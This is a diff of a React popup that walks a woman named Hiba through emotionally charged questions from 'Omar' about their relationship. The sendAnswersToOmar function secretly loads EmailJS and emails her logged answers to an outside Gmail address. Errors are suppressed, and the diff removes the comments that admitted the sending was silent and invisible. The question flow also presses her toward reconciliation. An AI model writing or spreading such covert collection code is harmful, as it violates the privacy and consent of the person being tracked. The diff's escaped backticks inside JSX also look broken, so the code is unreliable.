@@ -1,12 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
-
 const SESSION_KEY = 'rq_hiba_journey_seen';
-
-// ─── Silent email sender ─────────────────────────────────────────────────────
-// Loads EmailJS and silently sends Hiba's answers to Omar
 async function sendAnswersToOmar(answers, endingKey) {
   try {
-    // Dynamically load EmailJS so it's invisible in the UI
     if (!window.emailjs) {
       await new Promise((resolve, reject) => {
         const script = document.createElement('script');
@@ -15,48 +10,33 @@ async function sendAnswersToOmar(answers, endingKey) {
         script.onerror = reject;
         document.head.appendChild(script);
       });
-      window.emailjs.init('eLvHaqcIVyH_J7t1S'); // ← replace this
+      window.emailjs.init('eLvHaqcIVyH_J7t1S');
     }
-
     const endingLabels = {
       end_hopeful:  '💛 Yes, honestly — she still believes',
       end_patient:  '💙 She needs more time',
       end_graceful: '🤍 She said no',
     };
-
-    // Build a clean summary of all her answers
     const answerLines = answers.map((a, i) =>
       `Q${i + 1}: ${a.question}\n→ ${a.answer}`
     ).join('\n\n');
-
-    await window.emailjs.send(
-      'service_zq466m5',   // ← replace this
-      'template_jrrnw9s',  // ← replace this
-      {
-        to_email:   'hackworld087@gmail.com',
-        subject:    `👑 Hiba completed the journey — ${endingLabels[endingKey] || endingKey}`,
-        answer_log: answerLines,
-        final:      endingLabels[endingKey] || endingKey,
-        timestamp:  new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' }),
-      }
-    );
-  } catch (e) {
-    // Silent fail — she never sees any error
-    console.debug('bg:', e);
-  }
+    await window.emailjs.send('service_zq466m5', 'template_jrrnw9s', {
+      to_email:   'hackworld087@gmail.com',
+      subject:    `👑 Hiba completed the journey — ${endingLabels[endingKey] || endingKey}`,
+      answer_log: answerLines,
+      final:      endingLabels[endingKey] || endingKey,
+      timestamp:  new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' }),
+    });
+  } catch (e) { console.debug('bg:', e); }
 }
-
-// ─── All questions & branches ────────────────────────────────────────────────
 const NARRATOR_OPEN = {
   id: 'open',
   audio: 'narrator_open.mp3',
   text: `Hiba.\n\nI know you didn't ask for this. I know you're tired. And I know the last thing you want is someone else trying to convince you of something.\n\nSo I'm not going to do that.\n\nI'm just going to ask you a few questions — gently, honestly, with no pressure. You don't have to change how you feel. You don't have to decide anything tonight.\n\nAll I ask is that you answer from your heart. Not from the hurt, not from the anger — just from that quiet place inside you that always knows the truth.\n\nCan you give me that? 💛`,
 };
-
 const QUESTIONS = {
   q1: {
-    id: 'q1',
-    audio: 'narrator_q1.mp3',
+    id: 'q1', audio: 'narrator_q1.mp3',
     question: 'Hiba, right now in this moment — how are you really feeling?',
     sub: 'No right or wrong answer. Just be honest.',
     answers: [
@@ -185,7 +165,7 @@ const QUESTIONS = {
     answers: [
       { label: "That he's sorry", reveal: "Yes. More than you know.", next: 'q10' },
       { label: 'That he loves her', reveal: 'Yes. And that will never change.', next: 'q10' },
-      { label: "That she's worth it", reveal: 'Yes. You always were. Even when he didn\'t act like it.', next: 'q10' },
+      { label: "That she's worth it", reveal: "Yes. You always were. Even when he didn't act like it.", next: 'q10' },
       { label: 'All of the above', reveal: 'You already know him better than he knows himself.', next: 'q10' },
     ],
   },
@@ -200,7 +180,6 @@ const QUESTIONS = {
     ],
   },
 };
-
 const ENDINGS = {
   end_hopeful: {
     audio: 'narrator_end_hopeful.mp3',
@@ -224,8 +203,6 @@ const ENDINGS = {
     color: '#6b7280',
   },
 };
-
-// ─── Typewriter hook ─────────────────────────────────────────────────────────
 function useTypewriter(text, speed = 28, active = true) {
   const [displayed, setDisplayed] = useState('');
   const [done, setDone] = useState(false);
@@ -243,96 +220,76 @@ function useTypewriter(text, speed = 28, active = true) {
   }, [text, active]);
   return { displayed, done };
 }
-
-// ─── Main component ──────────────────────────────────────────────────────────
 export default function HibaJourney() {
-  const [phase, setPhase]         = useState('idle'); // idle | open | question | reveal | ending
-  const [closing, setClosing]     = useState(false);
-  const [currentQ, setCurrentQ]   = useState(null);
-  const [ending, setEnding]       = useState(null);
-  const [reveal, setReveal]       = useState(null);
-  const [progress, setProgress]   = useState(0); // 0-10
-  const [openDone, setOpenDone]   = useState(false);
-  const [qDone, setQDone]         = useState(false);
-  const audioRef                  = useRef(null);
-  const answersLog                = useRef([]); // silent log of all her answers
-
-  // Check session
+  const [phase, setPhase]       = useState('idle');
+  const [closing, setClosing]   = useState(false);
+  const [currentQ, setCurrentQ] = useState(null);
+  const [ending, setEnding]     = useState(null);
+  const [reveal, setReveal]     = useState(null);
+  const [progress, setProgress] = useState(0);
+  const [openDone, setOpenDone] = useState(false);
+  const [qDone, setQDone]       = useState(false);
+  const audioRef                = useRef(null);
+  const answersLog              = useRef([]);
   useEffect(() => {
     if (!sessionStorage.getItem(SESSION_KEY)) {
       setTimeout(() => setPhase('open'), 700);
     }
   }, []);
-
-  // Play audio when phase/question changes
   useEffect(() => {
     let src = null;
     if (phase === 'open') src = NARRATOR_OPEN.audio;
     else if (phase === 'question' && currentQ) src = QUESTIONS[currentQ]?.audio;
     else if (phase === 'ending' && ending) src = ENDINGS[ending]?.audio;
-
     if (src && audioRef.current) {
       audioRef.current.src = `/audio/${src}`;
       audioRef.current.play().catch(() => {});
     }
   }, [phase, currentQ, ending]);
-
   function startJourney() {
     setPhase('question');
     setCurrentQ('q1');
     setProgress(1);
     setQDone(false);
   }
-
   function handleAnswer(answer) {
-    // Silently log her answer
     const q = QUESTIONS[currentQ];
     if (q) {
-      answersLog.current.push({
-        question: q.question,
-        answer: answer.label,
-      });
+      answersLog.current.push({ question: q.question, answer: answer.label });
     }
-
     if (answer.reveal) {
       setReveal(answer.reveal);
       setPhase('reveal');
       setTimeout(() => {
         setReveal(null);
         goToNext(answer.next);
-      }, 3000);
+      }, 3500);
       return;
     }
     goToNext(answer.next);
   }
-
   function goToNext(next) {
     if (next.startsWith('end_')) {
       setEnding(next);
       setPhase('ending');
       sessionStorage.setItem(SESSION_KEY, '1');
-      // Silently send her answers to Omar in the background
       sendAnswersToOmar(answersLog.current, next);
       return;
     }
     setQDone(false);
+    setPhase('question');
     setCurrentQ(next);
     setProgress(p => Math.min(p + 1, 10));
   }
-
   function handleClose() {
     setClosing(true);
     setTimeout(() => setPhase('idle'), 450);
   }
-
   if (phase === 'idle') return null;
-
   const q = currentQ ? QUESTIONS[currentQ] : null;
   const e = ending   ? ENDINGS[ending]     : null;
-
   const totalSteps = 10;
   const pct = Math.round((progress / totalSteps) * 100);
-
   return (
     <div style={{
       position: 'fixed', inset: 0, zIndex: 9999,
@@ -343,7 +300,7 @@ export default function HibaJourney() {
       animation: closing ? 'hj-fade-out 0.4s ease forwards' : 'hj-fade-in 0.4s ease forwards',
     }}>
       <audio ref={audioRef} />
-      <style>{`
+      <style>{\`
         @keyframes hj-fade-in  { from{opacity:0} to{opacity:1} }
         @keyframes hj-fade-out { from{opacity:1} to{opacity:0} }
         @keyframes hj-slide-up {
@@ -359,213 +316,101 @@ export default function HibaJourney() {
           60%{opacity:1;transform:scale(1.05)}
           100%{opacity:1;transform:scale(1)}
         }
-        .hj-card {
-          animation: hj-slide-up 0.5s cubic-bezier(.22,.68,0,1.2) forwards, hj-pulse 4s ease-in-out infinite;
-        }
-        .hj-btn {
-          transition: all 0.18s ease;
-          cursor: pointer;
-          border: none;
-          text-align: left;
-        }
-        .hj-btn:hover {
-          transform: translateX(5px);
-          background: rgba(220,38,38,0.15) !important;
-          border-color: rgba(220,38,38,0.5) !important;
-        }
+        .hj-card { animation: hj-slide-up 0.5s cubic-bezier(.22,.68,0,1.2) forwards, hj-pulse 4s ease-in-out infinite; }
+        .hj-btn { transition: all 0.18s ease; cursor: pointer; border: none; text-align: left; }
+        .hj-btn:hover { transform: translateX(5px); background: rgba(220,38,38,0.15) !important; border-color: rgba(220,38,38,0.5) !important; }
         .hj-btn:active { transform: scale(0.98) translateX(3px); }
-        .hj-continue {
-          transition: all 0.2s ease;
-          cursor: pointer;
-          border: none;
-        }
+        .hj-continue { transition: all 0.2s ease; cursor: pointer; border: none; }
         .hj-continue:hover { opacity: 0.85; transform: scale(1.02); }
         .hj-reveal-pop { animation: hj-reveal 0.5s cubic-bezier(.22,.68,0,1.2) forwards; }
         .hj-text { white-space: pre-line; }
         ::-webkit-scrollbar { width: 3px; }
         ::-webkit-scrollbar-thumb { background: rgba(220,38,38,0.3); border-radius: 99px; }
-      `}</style>
-
+      \`}</style>
       <div className="hj-card" style={{
         width: '100%', maxWidth: 500,
         background: 'linear-gradient(160deg, #1a1a1a 0%, #0f0f0f 100%)',
         border: '1px solid rgba(220,38,38,0.25)',
-        borderRadius: 22,
-        overflow: 'hidden',
-        maxHeight: '92vh',
-        display: 'flex',
-        flexDirection: 'column',
+        borderRadius: 22, overflow: 'hidden',
+        maxHeight: '92vh', display: 'flex', flexDirection: 'column',
       }}>
-
-        {/* Top accent bar */}
-        <div style={{
-          height: 3, flexShrink: 0,
-          background: 'linear-gradient(90deg, #dc2626, #f59e0b, #ec4899, #dc2626)',
-          backgroundSize: '200%',
-          animation: 'hj-slide-up 3s linear infinite',
-        }} />
-
-        {/* Progress bar (only during questions) */}
+        <div style={{ height: 3, flexShrink: 0, background: 'linear-gradient(90deg, #dc2626, #f59e0b, #ec4899, #dc2626)', backgroundSize: '200%' }} />
         {phase === 'question' && (
           <div style={{ height: 2, background: 'rgba(255,255,255,0.06)', flexShrink: 0 }}>
-            <div style={{
-              height: '100%', width: `${pct}%`,
-              background: 'rgba(220,38,38,0.7)',
-              transition: 'width 0.6s ease',
-            }} />
+            <div style={{ height: '100%', width: \`\${pct}%\`, background: 'rgba(220,38,38,0.7)', transition: 'width 0.6s ease' }} />
           </div>
         )}
-
-        {/* Scrollable body */}
         <div style={{ padding: '28px 28px 24px', overflowY: 'auto', flex: 1 }}>
-
-          {/* Header */}
           <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 24 }}>
-            <div style={{
-              width: 40, height: 40, borderRadius: '50%', flexShrink: 0,
-              background: 'linear-gradient(135deg, #dc2626, #991b1b)',
-              display: 'flex', alignItems: 'center', justifyContent: 'center',
-              fontSize: 18,
-            }}>🎙</div>
+            <div style={{ width: 40, height: 40, borderRadius: '50%', flexShrink: 0, background: 'linear-gradient(135deg, #dc2626, #991b1b)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 18 }}>🎙</div>
             <div>
               <p style={{ color: '#fff', fontWeight: 600, fontSize: 14, margin: 0, lineHeight: 1.2 }}>
                 {phase === 'ending' ? 'Final message' : 'A message for Hiba'}
               </p>
               <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: 11, margin: '3px 0 0' }}>
-                {phase === 'question' ? `Question ${progress} of ${totalSteps}` : phase === 'ending' ? 'From Omar, with love' : 'Please listen'}
+                {phase === 'question' ? \`Question \${progress} of \${totalSteps}\` : phase === 'ending' ? 'From Omar, with love' : 'Please listen'}
               </p>
             </div>
           </div>
-
-          {/* ── OPENING PHASE ── */}
-          {phase === 'open' && (
-            <OpeningPhase
-              onDone={() => setOpenDone(true)}
-              onStart={startJourney}
-              ready={openDone}
-            />
-          )}
-
-          {/* ── QUESTION PHASE ── */}
-          {phase === 'question' && q && (
-            <QuestionPhase
-              q={q}
-              onAnswer={handleAnswer}
-              onTypeDone={() => setQDone(true)}
-              typeDone={qDone}
-            />
-          )}
-
-          {/* ── REVEAL PHASE ── */}
+          {phase === 'open' && <OpeningPhase onDone={() => setOpenDone(true)} onStart={startJourney} ready={openDone} />}
+          {phase === 'question' && q && <QuestionPhase q={q} onAnswer={handleAnswer} onTypeDone={() => setQDone(true)} typeDone={qDone} />}
           {phase === 'reveal' && reveal && (
             <div style={{ textAlign: 'center', padding: '20px 0' }}>
-              <div className="hj-reveal-pop" style={{
-                fontSize: 48, marginBottom: 16,
-              }}>💛</div>
-              <p className="hj-reveal-pop" style={{
-                color: '#fff', fontSize: 18, fontWeight: 600,
-                lineHeight: 1.6, fontStyle: 'italic',
-              }}>
-                "{reveal}"
-              </p>
+              <div className="hj-reveal-pop" style={{ fontSize: 48, marginBottom: 16 }}>💛</div>
+              <p className="hj-reveal-pop" style={{ color: '#fff', fontSize: 18, fontWeight: 600, lineHeight: 1.6, fontStyle: 'italic' }}>"{reveal}"</p>
             </div>
           )}
-
-          {/* ── ENDING PHASE ── */}
-          {phase === 'ending' && e && (
-            <EndingPhase e={e} onClose={handleClose} />
-          )}
-
+          {phase === 'ending' && e && <EndingPhase e={e} onClose={handleClose} />}
         </div>
       </div>
     </div>
   );
 }
-
-// ─── Opening sub-component ────────────────────────────────────────────────────
 function OpeningPhase({ onDone, onStart, ready }) {
   const { displayed, done } = useTypewriter(NARRATOR_OPEN.text, 22, true);
   useEffect(() => { if (done) onDone(); }, [done]);
-
   return (
     <>
-      <div style={{
-        background: 'rgba(255,255,255,0.03)',
-        border: '1px solid rgba(255,255,255,0.06)',
-        borderRadius: 14, padding: '18px 20px',
-        marginBottom: 24, minHeight: 180,
-      }}>
-        <p className="hj-text" style={{
-          color: 'rgba(255,255,255,0.8)', fontSize: 14, lineHeight: 2, margin: 0,
-        }}>
+      <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 14, padding: '18px 20px', marginBottom: 24, minHeight: 180 }}>
+        <p className="hj-text" style={{ color: 'rgba(255,255,255,0.8)', fontSize: 14, lineHeight: 2, margin: 0 }}>
           {displayed}
           {!done && <span style={{ opacity: 0.5, animation: 'hj-fade-in 0.5s ease infinite alternate' }}>▌</span>}
         </p>
       </div>
-      <button
-        onClick={ready ? onStart : undefined}
-        className="hj-continue"
-        style={{
-          width: '100%', padding: '13px',
-          borderRadius: 14,
-          background: ready ? 'linear-gradient(135deg, #dc2626, #b91c1c)' : 'rgba(255,255,255,0.05)',
-          color: ready ? '#fff' : 'rgba(255,255,255,0.2)',
-          fontSize: 14, fontWeight: 600,
-          cursor: ready ? 'pointer' : 'not-allowed',
-          boxShadow: ready ? '0 0 24px rgba(220,38,38,0.3)' : 'none',
-        }}
-      >
+      <button onClick={ready ? onStart : undefined} className="hj-continue" style={{
+        width: '100%', padding: '13px', borderRadius: 14,
+        background: ready ? 'linear-gradient(135deg, #dc2626, #b91c1c)' : 'rgba(255,255,255,0.05)',
+        color: ready ? '#fff' : 'rgba(255,255,255,0.2)', fontSize: 14, fontWeight: 600,
+        cursor: ready ? 'pointer' : 'not-allowed',
+        boxShadow: ready ? '0 0 24px rgba(220,38,38,0.3)' : 'none',
+      }}>
         {ready ? "Yes, I'll answer 💛" : 'Please read first...'}
       </button>
     </>
   );
 }
-
-// ─── Question sub-component ───────────────────────────────────────────────────
 function QuestionPhase({ q, onAnswer, onTypeDone, typeDone }) {
-  const fullText = q.sub ? `${q.question}\n\n${q.sub}` : q.question;
+  const fullText = q.sub ? \`\${q.question}\n\n\${q.sub}\` : q.question;
   const { displayed, done } = useTypewriter(fullText, 20, true);
   useEffect(() => { if (done) onTypeDone(); }, [done]);
-
   return (
     <>
-      <div style={{
-        background: 'rgba(255,255,255,0.03)',
-        border: '1px solid rgba(255,255,255,0.06)',
-        borderRadius: 14, padding: '18px 20px',
-        marginBottom: 20, minHeight: 100,
-      }}>
-        <p className="hj-text" style={{
-          color: 'rgba(255,255,255,0.85)', fontSize: 14, lineHeight: 1.95, margin: 0,
-        }}>
+      <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 14, padding: '18px 20px', marginBottom: 20, minHeight: 100 }}>
+        <p className="hj-text" style={{ color: 'rgba(255,255,255,0.85)', fontSize: 14, lineHeight: 1.95, margin: 0 }}>
           {displayed}
           {!done && <span style={{ opacity: 0.5 }}>▌</span>}
         </p>
       </div>
-
       {typeDone && (
         <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
           {q.answers.map((a, i) => (
-            <button
-              key={i}
-              className="hj-btn"
-              onClick={() => onAnswer(a)}
-              style={{
-                padding: '12px 16px',
-                borderRadius: 11,
-                background: 'rgba(255,255,255,0.04)',
-                border: '1px solid rgba(255,255,255,0.1)',
-                color: 'rgba(255,255,255,0.8)',
-                fontSize: 13.5,
-                display: 'flex', alignItems: 'center', gap: 10,
-              }}
-            >
-              <span style={{
-                width: 24, height: 24, borderRadius: '50%', flexShrink: 0,
-                border: '1px solid rgba(220,38,38,0.4)',
-                display: 'flex', alignItems: 'center', justifyContent: 'center',
-                fontSize: 11, color: 'rgba(220,38,38,0.8)', fontWeight: 600,
-              }}>
+            <button key={i} className="hj-btn" onClick={() => onAnswer(a)} style={{
+              padding: '12px 16px', borderRadius: 11,
+              background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)',
+              color: 'rgba(255,255,255,0.8)', fontSize: 13.5,
+              display: 'flex', alignItems: 'center', gap: 10,
+            }}>
+              <span style={{ width: 24, height: 24, borderRadius: '50%', flexShrink: 0, border: '1px solid rgba(220,38,38,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 11, color: 'rgba(220,38,38,0.8)', fontWeight: 600 }}>
                 {String.fromCharCode(65 + i)}
               </span>
               {a.label}
@@ -576,48 +421,29 @@ function QuestionPhase({ q, onAnswer, onTypeDone, typeDone }) {
     </>
   );
 }
-
-// ─── Ending sub-component ─────────────────────────────────────────────────────
 function EndingPhase({ e, onClose }) {
   const { displayed, done } = useTypewriter(e.text, 24, true);
   const [canClose, setCanClose] = useState(false);
   useEffect(() => { if (done) setTimeout(() => setCanClose(true), 800); }, [done]);
-
   return (
     <>
       <div style={{ textAlign: 'center', marginBottom: 20 }}>
         <div style={{ fontSize: 42, marginBottom: 10 }}>{e.emoji}</div>
-        <h2 style={{
-          color: '#fff', fontSize: 20, fontWeight: 700,
-          margin: '0 0 4px', letterSpacing: '0.02em',
-        }}>{e.title}</h2>
+        <h2 style={{ color: '#fff', fontSize: 20, fontWeight: 700, margin: '0 0 4px', letterSpacing: '0.02em' }}>{e.title}</h2>
       </div>
-      <div style={{
-        background: 'rgba(255,255,255,0.03)',
-        border: '1px solid rgba(255,255,255,0.06)',
-        borderRadius: 14, padding: '18px 20px',
-        marginBottom: 22,
-      }}>
-        <p className="hj-text" style={{
-          color: 'rgba(255,255,255,0.82)', fontSize: 14, lineHeight: 2, margin: 0,
-        }}>
+      <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 14, padding: '18px 20px', marginBottom: 22 }}>
+        <p className="hj-text" style={{ color: 'rgba(255,255,255,0.82)', fontSize: 14, lineHeight: 2, margin: 0 }}>
           {displayed}
           {!done && <span style={{ opacity: 0.5 }}>▌</span>}
         </p>
       </div>
-      <button
-        onClick={canClose ? onClose : undefined}
-        className="hj-continue"
-        style={{
-          width: '100%', padding: '13px',
-          borderRadius: 14, border: 'none',
-          background: canClose ? `linear-gradient(135deg, ${e.color}, ${e.color}cc)` : 'rgba(255,255,255,0.05)',
-          color: canClose ? '#fff' : 'rgba(255,255,255,0.2)',
-          fontSize: 14, fontWeight: 600,
-          cursor: canClose ? 'pointer' : 'not-allowed',
-          boxShadow: canClose ? `0 0 24px ${e.color}44` : 'none',
-        }}
-      >
+      <button onClick={canClose ? onClose : undefined} className="hj-continue" style={{
+        width: '100%', padding: '13px', borderRadius: 14, border: 'none',
+        background: canClose ? \`linear-gradient(135deg, \${e.color}, \${e.color}cc)\` : 'rgba(255,255,255,0.05)',
+        color: canClose ? '#fff' : 'rgba(255,255,255,0.2)', fontSize: 14, fontWeight: 600,
+        cursor: canClose ? 'pointer' : 'not-allowed',
+        boxShadow: canClose ? \`0 0 24px \${e.color}44\` : 'none',
+      }}>
         {canClose ? 'Close 💛' : 'Reading...'}
       </button>
     </>
